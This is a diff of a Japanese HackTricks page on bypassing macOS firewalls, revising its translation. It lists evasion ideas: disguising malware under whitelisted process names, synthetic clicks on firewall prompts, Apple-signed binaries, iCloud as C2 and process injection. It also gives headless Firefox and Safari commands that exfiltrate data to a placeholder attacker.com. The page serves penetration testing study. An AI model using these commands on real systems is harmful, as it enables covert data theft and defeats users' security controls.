@@ -1,53 +1,53 @@
 # macOS ファイアウォールのバイパス
 
 {% hint style="success" %}
-AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksのサポート</summary>
+<summary>Support HackTricks</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して**ハッキングトリックを共有**してください。
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-## 発見されたテクニック
+## 発見された技術
 
-以下のテクニックは、一部の macOS ファイアウォールアプリで機能することが確認されました。
+以下の技術は、いくつかのmacOSファイアウォールアプリで動作することが確認されました。
 
 ### ホワイトリスト名の悪用
 
-* たとえば、マルウェアを **`launchd`** のようなよく知られた macOS プロセスの名前で呼び出す
+* 例えば、**`launchd`**のようなよく知られたmacOSプロセスの名前でマルウェアを呼び出すこと。
 
-### シンセティッククリック
+### 合成クリック
 
-* ファイアウォールがユーザーに許可を求める場合、マルウェアに**許可をクリック**させる
+* ファイアウォールがユーザーに許可を求める場合、マルウェアに**許可をクリックさせる**。
 
-### Apple 署名のバイナリの使用
+### **Apple署名のバイナリを使用**
 
-* **`curl`** のようなものだけでなく、**`whois`** なども
+* **`curl`**のようなもの、また**`whois`**のような他のものも。
 
-### よく知られた Apple ドメイン
+### よく知られたAppleドメイン
 
-ファイアウォールは、**`apple.com`** や **`icloud.com`** のようなよく知られた Apple ドメインへの接続を許可している可能性があります。そして iCloud は C2 として使用されるかもしれません。
+ファイアウォールは、**`apple.com`**や**`icloud.com`**のようなよく知られたAppleドメインへの接続を許可している可能性があります。そしてiCloudはC2として使用される可能性があります。
 
 ### 一般的なバイパス
 
-ファイアウォールをバイパスしようとするいくつかのアイデア
+ファイアウォールをバイパスするためのいくつかのアイデア。
 
-### 許可されたトラフィックを確認する
+### 許可されたトラフィックの確認
 
-許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されているドメインやそれにアクセスできるアプリケーションを特定できます
+許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されたドメインや、どのアプリケーションがそれらにアクセスできるかを特定するのに役立ちます。
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### DNSの乱用
+### DNSの悪用
 
-DNSの解決は、おそらくDNSサーバーに連絡を取ることが許可されるであろう**`mdnsreponder`**署名済みアプリケーションを介して行われます。
+DNS解決は、DNSサーバーに接続することが許可されていると思われる**`mdnsreponder`**署名アプリケーションを介して行われます。
 
 <figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
@@ -74,13 +74,13 @@ end tell
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-* Safari
+* サファリ
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 ### プロセスインジェクションを介して
 
-**プロセスにコードをインジェクト**できれば、任意のサーバに接続することが許可されているプロセスにコードをインジェクトすることでファイアウォールの保護をバイパスできます:
+接続が許可されているプロセスに**コードをインジェクト**できれば、ファイアウォールの保護を回避できます：
 
 {% content-ref url="macos-proces-abuse/" %}
 [macos-proces-abuse](macos-proces-abuse/)
@@ -91,16 +91,16 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 * [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
 {% hint style="success" %}
-AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksのサポート</summary>
+<summary>HackTricksをサポートする</summary>
 
-* [**購読プラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
